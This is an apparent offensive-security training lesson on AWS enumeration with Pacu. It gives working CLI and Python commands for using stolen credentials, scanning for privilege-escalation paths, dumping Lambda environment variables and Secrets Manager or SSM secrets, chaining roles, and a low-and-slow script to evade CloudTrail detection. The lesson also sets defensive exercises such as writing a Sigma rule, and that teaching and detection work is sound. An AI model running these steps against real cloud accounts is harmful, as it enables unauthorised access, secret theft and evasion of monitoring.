---
title: "AWS Enumeration with Pacu — Permission Enumeration, Service Recon, Finding Attack Paths"
tags: [AWS, Pacu, enumeration, permission-enumeration, IAM, S3, EC2, Lambda,
       privilege-escalation, ATT&CK-T1580, ATT&CK-T1069.003, cloud-exploitation]
module: 04-BroadSurface-02
day: 186
related_topics:
  - AWS IAM Fundamentals (Day 182)
  - IAM Misconfiguration Attacks (Day 183)
  - SSRF to AWS Metadata Lab (Day 184)
  - Cloud Full Attack Lab (Day 192)
---

# Day 186 — AWS Enumeration with Pacu

> "Pacu is to AWS what Metasploit is to traditional exploitation — except that
> in Pacu, every module runs a legitimate AWS API call. There is no shellcode.
> The entire framework is documentation of how AWS services can be used
> against themselves. Learn the framework. Learn what each module does. Then
> learn to replicate every module manually, because understanding the API call
> is what matters — not the wrapper."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Install and configure Pacu with a set of stolen or test AWS credentials.
2. Run the IAM permission enumeration module to identify attack paths.
3. Use service-specific recon modules to map the target's cloud infrastructure.
4. Identify privilege escalation paths from enumeration output.
5. Replicate each Pacu module's core API calls manually using the AWS CLI.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| AWS IAM fundamentals | Day 182 |
| IAM misconfiguration attacks | Day 183 |
| AWS CLI configured | Day 182 |
| Python 3.8+ | Days 11–15 |

---

## Part 1 — Pacu Setup

```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# Start Pacu
python3 pacu.py

# Create a new session (one session per target/engagement)
Pacu (No Keys Set) > new_session target-engagement

# Import stolen credentials
Pacu (target-engagement) > set_keys
[*] Setting AWS Keys...
Access key ID: ASIAIOSFODNN7EXAMPLE
Secret access key: wJalrXUtnFEMI/...
Session token (optional): AQoDYXdzEJr...
Key alias (optional): stolen-web-role

# Verify identity
Pacu (target-engagement) > run iam__get_account_authorization_details
```

---

## Part 2 — IAM Enumeration Modules

### 2.1 — Who Am I?

```
Pacu (target-engagement) > whoami
```

Output:
```
[Identity]
  Account ID:  123456789012
  User ID:     AROA...
  ARN:         arn:aws:iam::123456789012:assumed-role/web-app-role/i-0abc123

[Keys]
  Access key ID: ASIA...
  Session token: Present
```

### 2.2 — Full IAM Enumeration

```
Pacu (target-engagement) > run iam__enum_permissions
```

This module calls every IAM-related read API and maps what the current
credential can do. Equivalent manual calls:

```bash
# Manual equivalent of iam__enum_permissions
aws iam get-account-authorization-details \
  --filter User Role Group LocalManagedPolicy

# Or: enumerate-iam (brute force approach — tests every API call)
pip install enumerate-iam
enumerate-iam \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN \
  --region us-east-1
```

### 2.3 — Privilege Escalation Analysis

```
Pacu (target-engagement) > run iam__privesc_scan
```

Pacu cross-references the enumerated permissions against the known list of
27+ privilege escalation paths (from Rhino Security Labs research) and outputs
which paths are available:

```
[+] Potential Privilege Escalation Paths Found:
    [CRITICAL] iam:CreatePolicyVersion
    [HIGH]     iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
    [HIGH]     iam:PassRole + ec2:RunInstances (+ iam:AddRoleToInstanceProfile)
```

**Manual equivalent:**

```python
# privesc_check.py — check for dangerous permissions manually
import boto3, json

ESCALATION_PERMS = [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion",
    "iam:AttachUserPolicy",
    "iam:AttachGroupPolicy",
    "iam:AttachRolePolicy",
    "iam:PutUserPolicy",
    "iam:PutGroupPolicy",
    "iam:PutRolePolicy",
    "iam:CreateAccessKey",
    "iam:PassRole",
    "iam:UpdateLoginProfile",
    "iam:CreateLoginProfile",
    "sts:AssumeRole",
    "lambda:CreateFunction",
    "lambda:InvokeFunction",
    "ec2:RunInstances",
    "glue:CreateJob",
    "cloudformation:CreateStack",
    "codebuild:StartBuild",
]

# Pacu provides this; manual enumeration requires testing each permission
for perm in ESCALATION_PERMS:
    service, action = perm.split(":")
    print(f"[ ] Check: {perm}")
```

---

## Part 3 — Service Recon Modules

### 3.1 — EC2 Recon

```
Pacu (target-engagement) > run ec2__enum
```

Enumerates instances, security groups, VPCs, subnets, key pairs, and
AMI snapshots in all regions.

```bash
# Manual equivalent
aws ec2 describe-instances --query \
  'Reservations[*].Instances[*].{ID:InstanceId,Type:InstanceType,IP:PublicIpAddress,
   Role:IamInstanceProfile.Arn,State:State.Name}' \
  --output table --region us-east-1

# Check for public snapshots (a data exposure vector)
aws ec2 describe-snapshots \
  --owner-ids 123456789012 \
  --query 'Snapshots[?Encrypted==`false`].[SnapshotId,Description,StartTime]' \
  --output table

# Check for exposed EBS volumes
aws ec2 describe-volumes \
  --query 'Volumes[?State==`available`].[VolumeId,Size,Encrypted]' \
  --output table
```

### 3.2 — S3 Recon

```
Pacu (target-engagement) > run s3__bucket_finder
Pacu (target-engagement) > run s3__enum
```

```bash
# Manual equivalent
# List all buckets in the account
aws s3 ls

# Check each bucket for public access configuration
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "=== $bucket ==="
  aws s3api get-public-access-block --bucket $bucket 2>/dev/null \
    | jq '.PublicAccessBlockConfiguration'
  aws s3api get-bucket-acl --bucket $bucket 2>/dev/null \
    | jq '.Grants[] | select(.Grantee.URI != null) | {URI: .Grantee.URI, Permission: .Permission}'
done
```

### 3.3 — Lambda Recon

```
Pacu (target-engagement) > run lambda__enum
```

Enumerates all Lambda functions, their execution roles, environment variables,
and code packages. Environment variables are a frequent source of secrets.

```bash
# Manual equivalent
# List all Lambda functions
aws lambda list-functions | jq '.Functions[].FunctionName'

# Get environment variables for each function
for fn in $(aws lambda list-functions | jq -r '.Functions[].FunctionName'); do
  echo "=== $fn ==="
  aws lambda get-function-configuration \
    --function-name $fn | jq '.Environment.Variables'
done

# Download function code (look for hardcoded secrets in the code)
aws lambda get-function --function-name process-uploads \
  | jq -r '.Code.Location' | xargs curl -s -o function.zip
unzip -p function.zip | grep -iE 'password|secret|key|token|api_key'
```

### 3.4 — Secrets Manager and SSM Parameter Store

```
Pacu (target-engagement) > run secretsmanager__enum
```

```bash
# List secrets (requires secretsmanager:ListSecrets)
aws secretsmanager list-secrets | jq '.SecretList[].Name'

# Read a secret value (requires secretsmanager:GetSecretValue)
aws secretsmanager get-secret-value --secret-id prod/db/password \
  | jq -r '.SecretString'

# SSM Parameter Store — often contains secrets as SecureString parameters
aws ssm describe-parameters | jq '.Parameters[].Name'
aws ssm get-parameters-by-path \
  --path /prod/ \
  --recursive \
  --with-decryption | jq '.Parameters[] | {Name: .Name, Value: .Value}'
```

---

## Part 4 — Post-Enumeration Attack Path Mapping

After full enumeration, map the attack paths available:

```
Credentials: stolen from IMDS (web-app-role)
              ↓
IAM permissions:
  s3:GetObject, s3:ListBucket on arn:aws:s3:::uploads-prod/*
  lambda:InvokeFunction on arn:aws:lambda:*:123456789012:function:process-*
  iam:PassRole → MISSING (no escalation via Lambda)
  sts:AssumeRole on arn:aws:iam::123456789012:role/backup-role
              ↓
Attack paths:
  [AVAILABLE] Read all objects in uploads-prod → data exfiltration
  [AVAILABLE] Assume backup-role (check its permissions for escalation)
  [BLOCKED] Lambda privilege escalation (no PassRole)
              ↓
Role chain:
  web-app-role → assume backup-role
  backup-role permissions: s3:* on all buckets, ec2:DescribeInstances
  → Read all S3 buckets across the account
  → Does backup-role have iam:* ? → Check
```

```bash
# After assuming backup-role, enumerate its permissions
BACKUP_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/backup-role \
  --role-session-name pacu-enum)

# Update environment and enumerate
export AWS_ACCESS_KEY_ID=$(echo $BACKUP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $BACKUP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $BACKUP_CREDS | jq -r '.Credentials.SessionToken')

# What can backup-role do?
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:role/backup-role \
  --action-names "iam:CreateUser" "iam:AttachUserPolicy" "s3:ListAllMyBuckets" \
  | jq '.EvaluationResults[] | {Action: .EvalActionName, Decision: .EvalDecision}'
```

---

## Part 5 — CloudTrail Footprint Analysis

Understanding what Pacu's enumeration looks like in CloudTrail helps on both
the offensive side (evade detection) and defensive side (write detection rules):

```bash
# What CloudTrail events does IAM enumeration generate?
# All read IAM calls appear in the management event log:
#   iam:GetUser, iam:ListAttachedUserPolicies, iam:GetPolicyVersion
#   iam:ListRoles, iam:GetRole, iam:ListAttachedRolePolicies
#   sts:GetCallerIdentity (always the first call)

# Look for rapid enumeration bursts in CloudTrail
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=web-app-role \
  --start-time 2024-01-01T00:00:00Z \
  | jq '.Events[] | {Time: .EventTime, Event: .EventName}'

# A real enumeration session looks like:
# 00:00:01  sts:GetCallerIdentity
# 00:00:02  iam:GetAccountAuthorizationDetails
# 00:00:03  iam:ListAttachedUserPolicies
# 00:00:04  iam:GetPolicyVersion (x5 — one per policy)
# 00:00:05  iam:ListRoles
# ...50+ IAM read calls in under 30 seconds
```

**Low-and-slow alternative (attacker evasion):**

```bash
# Introduce random delays between API calls to avoid burst detection
import time, random
import boto3

iam = boto3.client("iam")
calls = [iam.get_user, iam.list_roles, iam.list_users, iam.list_policies]
for call in calls:
    result = call()
    time.sleep(random.uniform(5, 30))   # 5–30 second delay between calls
```

---

## Key Takeaways

1. **Pacu is documentation as a framework.** Every module is a codified
   AWS attack technique. Read the source code for each module you run —
   understanding the API calls is more valuable than the tool output.
2. **Enumeration always precedes exploitation.** Running `iam__privesc_scan`
   before blindly attempting escalation paths saves time and reduces CloudTrail
   noise.
3. **Lambda environment variables are a high-yield target.** Functions with
   `DATABASE_URL`, `API_KEY`, `SECRET_KEY` in environment variables are common.
   The `lambda:GetFunctionConfiguration` permission is all you need.
4. **Every Pacu module can be replicated with AWS CLI + jq.** Understanding
   the manual commands makes you independent of the tool — important when Pacu
   is unavailable or when you need to customise the enumeration.
5. **Enumeration generates CloudTrail events.** A burst of 50+ IAM read calls
   in 30 seconds is detectable. Pacing enumeration reduces the signature — but
   also know that defenders who monitor CloudTrail for this pattern will detect
   any pace eventually.

---

## Exercises

1. Install Pacu and configure it with LocalStack credentials. Run
   `iam__enum_permissions` and `iam__privesc_scan`. Document the output.
   Then replicate both using raw AWS CLI commands.
2. Write a Sigma rule that detects rapid IAM enumeration: a credential that
   generates more than 20 different IAM read API calls within a 60-second
   window. What log source? What field names?
3. Run `lambda__enum` on the LocalStack lab. Download the code for the
   `process-uploads` function. Inspect it for hardcoded secrets or
   vulnerable code patterns (SQLi, command injection).
4. Research the `iam:SimulatePrincipalPolicy` API call. How can an attacker
   use this to determine their permissions without triggering resource-specific
   API calls? How can a defender use it to audit a role's effective permissions?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q186.1, Q186.2 …).
> Follow-up questions use hierarchical numbering (Q186.1.1, Q186.1.2 …).

---

## Navigation

← Previous: [Day 185 — S3 Misconfiguration Lab](DAY-0185-S3-Misconfiguration-Lab.md)
→ Next: [Day 187 — Lambda and Serverless Attacks](DAY-0187-Lambda-and-Serverless-Attacks.md)
